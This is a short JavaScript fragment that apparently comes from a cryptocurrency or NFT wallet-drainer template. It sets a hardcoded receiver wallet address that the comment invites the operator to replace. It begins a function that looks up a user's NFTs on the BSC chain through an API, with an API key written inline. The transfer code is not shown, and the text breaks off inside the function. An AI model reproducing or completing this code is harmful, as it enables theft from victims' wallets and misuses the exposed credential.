...
const receiver_addres = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
...
async function getNFTs(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="bsc", limit="98"){
  return new Promise((resolve, reject)=>{
